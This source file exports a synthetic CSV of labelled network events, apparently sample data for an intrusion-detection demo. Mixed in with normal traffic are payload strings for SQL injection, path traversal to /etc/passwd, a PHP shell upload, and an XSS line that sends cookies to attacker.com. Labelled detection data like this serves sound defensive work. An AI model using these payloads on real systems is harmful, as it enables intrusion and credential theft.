export const SAMPLE_SECURITY_EVENTS_CSV = `timestamp,source_ip,destination_ip,source_port,destination_port,protocol,packet_count,byte_count,flow_duration_ms,syn_count,ack_count,fin_count,failed_login_count,success_login_count,http_method,user_agent,payload_sample,label,attack_category
2026-10-06 09:00:01,192.168.1.105,10.0.0.15,54120,443,TCP,45,28500,1250,2,42,1,0,1,GET,Mozilla/5.0 (Windows NT 10.0; Win64; x64),TLSv1.3 Client Hello normal session,Normal,Normal
2026-10-06 09:00:04,192.168.1.112,8.8.8.8,59821,53,UDP,2,148,45,0,0,0,0,0,-,-,Standard DNS query A corporate.internal,Normal,Normal
2026-10-06 09:00:10,192.168.1.130,10.0.0.20,51230,80,TCP,18,4200,320,1,16,1,0,0,GET,curl/7.88.1,HTTP/1.1 Healthcheck API probe,Normal,Normal
2026-10-06 09:00:15,192.168.1.145,10.0.0.12,41001,22,TCP,3,180,85,3,0,0,1,0,SSH,OpenSSH_8.9,SSH-2.0-OpenSSH auth attempt root,Malicious,Brute Force
2026-10-06 09:00:18,192.168.1.145,10.0.0.12,41002,22,TCP,3,180,90,3,0,0,2,0,SSH,OpenSSH_8.9,SSH-2.0-OpenSSH auth attempt admin,Malicious,Brute Force
2026-10-06 09:00:21,192.168.1.145,10.0.0.12,41003,22,TCP,4,210,88,4,0,0,3,0,SSH,OpenSSH_8.9,SSH-2.0-OpenSSH auth attempt user,Malicious,Brute Force
2026-10-06 09:00:24,192.168.1.145,10.0.0.12,41004,22,TCP,3,180,92,3,0,0,4,0,SSH,OpenSSH_8.9,SSH-2.0-OpenSSH auth attempt test,Malicious,Brute Force
2026-10-06 09:00:27,192.168.1.145,10.0.0.12,41005,22,TCP,4,210,89,4,0,0,5,0,SSH,OpenSSH_8.9,SSH-2.0-OpenSSH auth attempt backup,Malicious,Brute Force
2026-10-06 09:00:30,192.168.1.145,10.0.0.12,41006,22,TCP,3,180,91,3,0,0,6,0,SSH,OpenSSH_8.9,SSH-2.0-OpenSSH auth attempt oracle,Malicious,Brute Force
2026-10-06 09:00:33,192.168.1.145,10.0.0.12,41007,22,TCP,4,220,95,4,0,0,7,0,SSH,OpenSSH_8.9,SSH-2.0-OpenSSH auth attempt guest,Malicious,Brute Force
2026-10-06 09:00:36,192.168.1.145,10.0.0.12,41008,22,TCP,3,180,87,3,0,0,8,0,SSH,OpenSSH_8.9,SSH-2.0-OpenSSH auth attempt deploy,Malicious,Brute Force
2026-10-06 09:00:40,192.168.1.108,10.0.0.15,49811,443,TCP,62,45100,2100,2,58,1,0,1,POST,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),REST API JSON telemetry sync,Normal,Normal
2026-10-06 09:00:45,45.33.32.156,10.0.0.50,60101,21,TCP,1,40,12,1,0,0,0,0,-,-,TCP SYN stealth scan port 21 ftp,Malicious,Port Scan
2026-10-06 09:00:46,45.33.32.156,10.0.0.50,60102,22,TCP,1,40,11,1,0,0,0,0,-,-,TCP SYN stealth scan port 22 ssh,Malicious,Port Scan
2026-10-06 09:00:47,45.33.32.156,10.0.0.50,60103,23,TCP,1,40,13,1,0,0,0,0,-,-,TCP SYN stealth scan port 23 telnet,Malicious,Port Scan
2026-10-06 09:00:48,45.33.32.156,10.0.0.50,60104,80,TCP,1,40,10,1,0,0,0,0,-,-,TCP SYN stealth scan port 80 http,Malicious,Port Scan
2026-10-06 09:00:49,45.33.32.156,10.0.0.50,60105,443,TCP,1,40,14,1,0,0,0,0,-,-,TCP SYN stealth scan port 443 https,Malicious,Port Scan
2026-10-06 09:00:50,45.33.32.156,10.0.0.50,60106,3306,TCP,1,40,11,1,0,0,0,0,-,-,TCP SYN stealth scan port 3306 mysql,Malicious,Port Scan
2026-10-06 09:00:51,45.33.32.156,10.0.0.50,60107,3389,TCP,1,40,12,1,0,0,0,0,-,-,TCP SYN stealth scan port 3389 rdp,Malicious,Port Scan
2026-10-06 09:00:52,45.33.32.156,10.0.0.50,60108,8080,TCP,1,40,15,1,0,0,0,0,-,-,TCP SYN stealth scan port 8080 web-alt,Malicious,Port Scan
2026-10-06 09:01:00,192.168.1.115,10.0.0.18,52104,443,TCP,85,62000,1890,2,80,1,0,1,GET,Mozilla/5.0 (Windows NT 10.0; Win64; x64),Websocket connection keepalive,Normal,Normal
2026-10-06 09:01:05,185.190.140.22,10.0.0.100,53412,80,TCP,2500,1450000,950,2400,0,0,0,0,GET,Python-urllib/3.10,TCP SYN Flood volumetric exhaustion DoS,Malicious,DoS/DDoS
2026-10-06 09:01:08,185.190.140.22,10.0.0.100,53413,80,TCP,3100,1850000,980,3000,0,0,0,0,GET,Python-urllib/3.10,TCP SYN Flood volumetric exhaustion DoS,Malicious,DoS/DDoS
2026-10-06 09:01:12,185.190.140.22,10.0.0.100,53414,80,TCP,2900,1720000,920,2800,0,0,0,0,GET,Python-urllib/3.10,TCP SYN Flood volumetric exhaustion DoS,Malicious,DoS/DDoS
2026-10-06 09:01:18,192.168.1.122,10.0.0.15,58129,443,TCP,34,14200,850,2,30,1,0,1,GET,Mozilla/5.0 (X11; Ubuntu; Linux x86_64),Dashboard telemetry polling,Normal,Normal
2026-10-06 09:01:25,198.51.100.89,10.0.0.25,48920,80,TCP,8,2450,180,1,6,1,0,0,GET,sqlmap/1.6#stable,"GET /search.php?id=1' UNION SELECT username,password FROM users--",Malicious,Web Attack
2026-10-06 09:01:28,198.51.100.89,10.0.0.25,48921,80,TCP,9,2890,195,1,7,1,0,0,POST,sqlmap/1.6#stable,"POST /login.php username=admin' OR 1=1--&pwd=xxx",Malicious,Web Attack
2026-10-06 09:01:31,198.51.100.89,10.0.0.25,48922,80,TCP,7,2120,165,1,5,1,0,0,GET,Mozilla/5.0,"GET /comment?body=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>",Malicious,Web Attack
2026-10-06 09:01:40,192.168.1.180,194.26.29.112,49900,6667,TCP,28,4850,5600,2,24,1,0,0,-,-,"C2 Beacon heartbeat channel command irc.darkbot-net.ru PING/PONG",Malicious,Botnet
2026-10-06 09:01:45,192.168.1.180,194.26.29.112,49901,6667,TCP,32,5920,6200,2,28,1,0,0,-,-,"C2 Exec command bot_id=1488 payload_hash=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",Malicious,Botnet
2026-10-06 09:01:52,192.168.1.190,10.0.0.8,55432,4444,TCP,42,8840,4200,2,38,1,0,0,-,-,"Metasploit reverse TCP shell established UID=0 root payload /bin/sh",Malicious,Infiltration
2026-10-06 09:02:00,192.168.1.190,203.0.113.77,55433,8888,TCP,180,350000,12400,3,172,1,0,0,-,-,"Outbound encrypted archive exfiltration /etc/shadow archive.tar.gz",Malicious,Infiltration
2026-10-06 09:02:05,192.168.1.195,10.0.0.15,57612,443,TCP,95,124000,3100,2,90,1,0,1,GET,Mozilla/5.0,"Malicious binary dropper download hash=5d41402abc4b2a76b9719d911017c592 malicious_agent.exe",Malicious,Malware
2026-10-06 09:02:15,192.168.1.101,10.0.0.15,50100,443,TCP,52,38000,1400,2,48,1,0,1,GET,Mozilla/5.0 (Windows NT 10.0; Win64; x64),Document view internal portal,Normal,Normal
2026-10-06 09:02:20,192.168.1.102,10.0.0.16,50101,443,TCP,64,49000,1650,2,60,1,0,1,POST,Mozilla/5.0 (Windows NT 10.0; Win64; x64),HR Management Form Submit,Normal,Normal
2026-10-06 09:02:25,192.168.1.103,10.0.0.17,50102,443,TCP,41,29000,1100,2,38,1,0,1,GET,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),Internal Wiki page navigation,Normal,Normal
2026-10-06 09:02:30,192.168.1.104,8.8.4.4,59990,53,UDP,2,156,38,0,0,0,0,0,-,-,Standard DNS query AAAA cdn.company.com,Normal,Normal
2026-10-06 09:02:35,192.168.1.105,10.0.0.15,54125,443,TCP,48,31000,1320,2,44,1,0,1,GET,Mozilla/5.0 (Windows NT 10.0; Win64; x64),File download static asset image.png,Normal,Normal
2026-10-06 09:02:40,192.168.1.106,10.0.0.22,50105,80,TCP,15,3600,280,1,13,1,0,0,GET,curl/7.88.1,Microservice healthcheck ping,Normal,Normal
2026-10-06 09:02:45,192.168.1.107,10.0.0.15,54130,443,TCP,55,41000,1520,2,51,1,0,1,POST,Mozilla/5.0 (Windows NT 10.0; Win64; x64),Payment webhook handler invocation,Normal,Normal
2026-10-06 09:02:50,192.168.1.109,10.0.0.30,51100,3306,TCP,30,8500,640,2,27,1,0,1,-,-,Authorized DB query from app server worker,Normal,Normal
2026-10-06 09:02:55,192.168.1.110,10.0.0.35,51102,6379,TCP,12,1450,180,1,10,1,0,0,-,-,Redis cache GET session_token,Normal,Normal
2026-10-06 09:03:00,192.168.1.111,10.0.0.12,50200,22,TCP,22,12500,820,2,19,1,0,1,SSH,OpenSSH_8.9,Sysadmin authorized maintenance session,Normal,Normal
2026-10-06 09:03:05,103.224.182.245,10.0.0.12,42100,22,TCP,3,180,89,3,0,0,1,0,SSH,libssh2_1.10.0,Dictionary attack attempt admin,Malicious,Brute Force
2026-10-06 09:03:08,103.224.182.245,10.0.0.12,42101,22,TCP,3,180,91,3,0,0,2,0,SSH,libssh2_1.10.0,Dictionary attack attempt root,Malicious,Brute Force
2026-10-06 09:03:11,103.224.182.245,10.0.0.12,42102,22,TCP,4,210,90,4,0,0,3,0,SSH,libssh2_1.10.0,Dictionary attack attempt toor,Malicious,Brute Force
2026-10-06 09:03:14,103.224.182.245,10.0.0.12,42103,22,TCP,3,180,92,3,0,0,4,0,SSH,libssh2_1.10.0,Dictionary attack attempt postgres,Malicious,Brute Force
2026-10-06 09:03:17,103.224.182.245,10.0.0.12,42104,22,TCP,4,210,88,4,0,0,5,0,SSH,libssh2_1.10.0,Dictionary attack attempt git,Malicious,Brute Force
2026-10-06 09:03:20,103.224.182.245,10.0.0.12,42105,22,TCP,3,180,94,3,0,0,6,0,SSH,libssh2_1.10.0,Dictionary attack attempt ubuntu,Malicious,Brute Force
2026-10-06 09:03:25,91.240.118.170,10.0.0.60,58901,80,TCP,1,40,11,1,0,0,0,0,-,-,ZGrab scan probe port 80,Malicious,Port Scan
2026-10-06 09:03:26,91.240.118.170,10.0.0.60,58902,443,TCP,1,40,12,1,0,0,0,0,-,-,ZGrab scan probe port 443,Malicious,Port Scan
2026-10-06 09:03:27,91.240.118.170,10.0.0.60,58903,8080,TCP,1,40,14,1,0,0,0,0,-,-,ZGrab scan probe port 8080,Malicious,Port Scan
2026-10-06 09:03:28,91.240.118.170,10.0.0.60,58904,8443,TCP,1,40,13,1,0,0,0,0,-,-,ZGrab scan probe port 8443,Malicious,Port Scan
2026-10-06 09:03:29,91.240.118.170,10.0.0.60,58905,9200,TCP,1,40,15,1,0,0,0,0,-,-,ZGrab scan probe port 9200 elasticsearch,Malicious,Port Scan
2026-10-06 09:03:35,172.16.4.50,10.0.0.100,61200,80,TCP,3400,2100000,990,3200,0,0,0,0,GET,Wget/1.21.3,HTTP GET Flood exhaustion attack DoS,Malicious,DoS/DDoS
2026-10-06 09:03:38,172.16.4.50,10.0.0.100,61201,80,TCP,3800,2400000,995,3600,0,0,0,0,GET,Wget/1.21.3,HTTP GET Flood exhaustion attack DoS,Malicious,DoS/DDoS
2026-10-06 09:03:45,212.192.241.10,10.0.0.25,51090,80,TCP,12,3800,240,1,10,1,0,0,GET,Mozilla/5.0,"GET /index.php?file=../../../../etc/passwd Path Traversal",Malicious,Web Attack
2026-10-06 09:03:48,212.192.241.10,10.0.0.25,51091,80,TCP,14,4500,260,1,12,1,0,0,POST,Mozilla/5.0,"POST /upload.php shell.phtml Content-Type: application/x-php",Malicious,Web Attack
2026-10-06 09:03:55,192.168.1.185,185.220.101.5,50220,9001,TCP,45,18900,4800,2,40,1,0,0,-,-,"Tor Exit Node encrypted C2 circuit establish 185.220.101.5",Malicious,Botnet
2026-10-06 09:04:00,192.168.1.108,10.0.0.15,54135,443,TCP,58,42500,1580,2,54,1,0,1,GET,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),User profile settings retrieval,Normal,Normal
2026-10-06 09:04:05,192.168.1.114,10.0.0.15,54136,443,TCP,49,36000,1310,2,45,1,0,1,GET,Mozilla/5.0 (Windows NT 10.0; Win64; x64),Customer support dashboard live sync,Normal,Normal
2026-10-06 09:04:10,192.168.1.116,10.0.0.12,50210,22,TCP,19,10200,750,2,16,1,0,1,SSH,OpenSSH_8.9,DevOps deployment runner authenticated,Normal,Normal
2026-10-06 09:04:15,192.168.1.118,10.0.0.40,51105,5432,TCP,36,11200,910,2,32,1,0,1,-,-,PostgreSQL database select statement execute,Normal,Normal
2026-10-06 09:04:20,192.168.1.120,10.0.0.15,54140,443,TCP,60,44000,1620,2,56,1,0,1,POST,Mozilla/5.0 (Windows NT 10.0; Win64; x64),File upload invoice PDF verification,Normal,Normal`;
